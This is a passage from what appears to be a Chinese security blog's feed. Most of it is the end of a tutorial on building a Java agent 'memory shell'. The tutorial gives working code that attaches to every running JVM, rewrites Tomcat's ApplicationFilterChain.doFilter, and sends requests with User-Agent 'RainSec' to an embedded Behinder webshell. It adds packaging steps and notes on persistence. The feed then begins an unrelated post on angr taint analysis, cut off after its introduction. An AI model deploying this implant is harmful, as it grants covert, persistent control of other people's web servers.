punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Agent start ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//t继承了ClassFileTransformer接口，重写了transform方法，用于拦截修改加载的类字节码，此方法返回值是通过javassist修改好的字节码，</span>        <span class="token keyword">final</span> t t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">t</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取目标所有已经加载的类</span>        <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classes <span class="token operator">=</span> i<span class="token punctuation">.</span><span class="token function">getAllLoadedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Class</span> aClass <span class="token operator">:</span> classes<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>aClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">TransformedClassName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment">//这里修改的是org.apache.catalina.core.ApplicationFilterChain类的doFilter方法，测试的时候有一个坑点是测试jar包启动时需要访问一下Web，ApplicationFilterChain类才会加载，上面获取所有类的时候才可以获取到ApplicationFilterChain类。</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Agent get TransformedClassName ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//添加拦截器</span>                i<span class="token punctuation">.</span><span class="token function">addTransformer</span><span class="token punctuation">(</span>t1<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//重新定义ApplicationFilterChain类，触发拦截器也就是t类的transform方法</span>                i<span class="token punctuation">.</span><span class="token function">retransformClasses</span><span class="token punctuation">(</span>aClass<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">"ERROR::"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>            <span class="token keyword">throws</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>                <span class="token comment">//agent.jar 用到的核心类VirtualMachine和VirtualMachineDescriptor在jdk的tools.jar里，如果直接把tools.jar一块打进agent.jar里，不能跨平台使用，笔者测试mac编译无法在linux中使用</span>                <span class="token comment">//通过URLClassLoader加载目标环境的tools.jar，可以变得更加通用</span>                <span class="token class-name">String</span> toolsJarPath <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.home"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> <span class="token string">".."</span> <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> <span class="token string">"lib"</span> <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> <span class="token string">"tools.jar"</span><span class="token punctuation">;</span>                <span class="token class-name">URLClassLoader</span> classLoader <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>toolsJarPath<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"tools.jar load error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> vmClass <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> vmdClass <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    vmClass <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.sun.tools.attach.VirtualMachine"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    vmdClass <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.sun.tools.attach.VirtualMachineDescriptor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token class-name">Object</span> vmObj <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> agentpath <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    agentpath <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">//获取agent.jar的绝对路径</span>                    agentpath <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getProtectionDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCodeSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment">//通过VirtualMachineDescriptor类的list方法 获取目标环境中运行的Java进程，省去查找pid这一步</span>                    <span class="token class-name">Method</span> listMethod <span class="token operator">=</span> vmClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"list"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> vmlist <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span> listMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">Method</span> idMethod <span class="token operator">=</span> vmdClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">Method</span> displayNameMethod<span class="token operator">=</span> vmdClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"displayName"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Object</span> vmd <span class="token operator">:</span> vmlist<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"get vmname: %s  pid: %s"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> displayNameMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>vmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> idMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>vmd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> idMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>vmd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    agentpath <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getProtectionDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCodeSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"usage : java -jar agent.jar\r\njava -jar agent.jar pid\r\njava -jar agent.jar pid agentpath"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Parameter error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">" agentpath :"</span> <span class="token operator">+</span> agentpath<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> pid <span class="token operator">:</span>list<span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"try attach %s"</span><span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token class-name">Method</span> attachMethod <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                        <span class="token keyword">try</span> <span class="token punctuation">{</span>                            <span class="token comment">//连接到此Java进程</span>                            attachMethod <span class="token operator">=</span> vmClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"attach"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        vmObj <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span> attachMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>vmObj <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token comment">//加载agent.jar 触发agentmain方法</span>                            <span class="token class-name">Method</span> loadAgentMethod2 <span class="token operator">=</span> vmClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"loadAgent"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            loadAgentMethod2<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>vmObj<span class="token punctuation">,</span> agentpath<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">!=</span> vmObj<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token class-name">Method</span> detachMethod <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                            <span class="token keyword">try</span> <span class="token punctuation">{</span>                                <span class="token comment">//断开连接</span>                                detachMethod <span class="token operator">=</span> vmClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"detach"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">try</span> <span class="token punctuation">{</span>                                detachMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>vmObj<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>t.transform 读取jar包里的start.txt，把读取到的内容插入到ApplicationFilterChain类的doFilter方法里，默认所有路由都有效，可以添加User-Agent来判断是否走到webshell，org.apache.spring.b.d就是一个冰蝎马</p><pre class="line-numbers language-none"><code class="language-none">{    javax.servlet.http.HttpServletRequest request = $1;    javax.servlet.http.HttpServletResponse response = $2;    try {        Object session = request.getSession();        if (request.getHeader("User-Agent").equals("RainSec")) {            org.apache.spring.b.d(request, response, session);            return ;        }    } catch (Exception e) {    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建 /src/main/resources/META-INF/MANIFEST.MF 文件，内容如下</p><pre class="line-numbers language-none"><code class="language-none">Manifest-Version: 1.0Agent-Class: org.apache.spring.mCan-Redefine-Classes: trueCan-Retransform-Classes: trueCan-Set-Native-Method-Prefix: trueMain-Class: org.apache.spring.m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pom.xml 中加入此配置把自定义的MANIFEST.MF打到jar包中</p><pre class="line-numbers language-none"><code class="language-none">&lt;plugin&gt;&lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;&lt;version&gt;3.2.0&lt;/version&gt;&lt;configuration&gt;&lt;archive&gt;                        &lt;manifestEntries&gt;&lt;/manifestEntries&gt;                        &lt;manifestFile&gt;src/main/resources/META-INF/MANIFEST.MF&lt;/manifestFile&gt;                    &lt;/archive&gt;&lt;/configuration&gt;&lt;/plugin&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mvn clean package -DskipTests 编译 。</p><h3 id="几个坑点"><a href="#几个坑点" class="headerlink" title="几个坑点"></a>几个坑点</h3><p>最后记录一下整个编写测试中遇到的坑点。</p><ol><li>刚开始直接找了几个项目编译测试均失败，后发现是tools.jar 的问题，最后用URLClassLoader加载目标环境下tools.jar 解决。</li><li>测试springboot jar包启动后需访问一下web才会加载ApplicationFilterChain类，后续才能获取到再修改。</li><li>本项目注入的内存马非常容易修改，测试了一下注入蚁剑webshell，因为蚁剑连接webshell不是用的反射会连接失败。</li><li>刚开始想改的是threedr3am师傅的ZhouYu项目，发现直接持久化直接替换jar包会导致服务异常，重启替换后的jar之后shell可正常使用，后续添加持久化功能可以在注入进程退出时再执行替换jar包。<br>笔者找到的一些agent内存马项目<br><a href="https://github.com/ethushiroha/JavaAgentTools">https://github.com/ethushiroha/JavaAgentTools</a><br><a href="https://github.com/threedr3am/ZhouYu">https://github.com/threedr3am/ZhouYu</a><br><a href="https://github.com/su18/MemoryShell">https://github.com/su18/MemoryShell</a></li></ol><p>本文内容大量引用或参考以下文章：<br><a href="https://mp.weixin.qq.com/s/YVwqD6SwUq_jkEe_9afBCg">https://mp.weixin.qq.com/s/YVwqD6SwUq_jkEe_9afBCg</a><br><a href="https://mp.weixin.qq.com/s/gmKSmW5SIME8lWKj8bvhWw">https://mp.weixin.qq.com/s/gmKSmW5SIME8lWKj8bvhWw</a><br><a href="https://cangqingzhe.github.io/2021/10/13/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/">https://cangqingzhe.github.io/2021/10/13/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;初识Java-agent类型内存马&quot;&gt;&lt;a href=&quot;#初识Java-agent类型内存马&quot; class=&quot;headerlink&quot; title=&quot;初识Java agent类型内存马&quot;&gt;&lt;/a&gt;初识Java agent类型内存马&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="攻防研究" scheme="https://rainsec.cn/categories/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="攻防研究" scheme="https://rainsec.cn/tags/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>Angr Taint Analysis</title>
    <link href="https://rainsec.cn/post/Angr%20Taint%20Analysis.html"/>
    <id>https://rainsec.cn/post/Angr%20Taint%20Analysis.html</id>
    <published>2023-03-14T07:07:45.000Z</published>
    <updated>2023-04-12T02:36:51.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Angr-Taint-Analysis"><a href="#Angr-Taint-Analysis" class="headerlink" title="Angr Taint Analysis"></a>Angr Taint Analysis</h1><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>本人一直致力于二进制分析和自动化漏洞挖掘领域，这次抛砖引玉，希望可以大家多多指导</p></blockquote><p>污点分析的基本分类：</p><ol><li>动态污点分析</li><li>静态污点分析</li></ol><p>上述分析方式都有自己的优缺点，对于动态污点分析来说，缺点如下：</p><ol><li>分析结果依赖输入。</li><li>一些隐式调用难以跟踪。</li></ol><p>静态污点分析的缺点如下：</p><ol><li>路径爆炸问题。</li><li>一些程序特性只有在动态执行的过程中才会展示出来。</li></ol><p>angr本身的知识内容多而且杂乱，下面对一些核心的基础知识进行一下讲解。</p><h2 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h2><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/image-20230129175501809.18qov5sev3xc.png"></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" 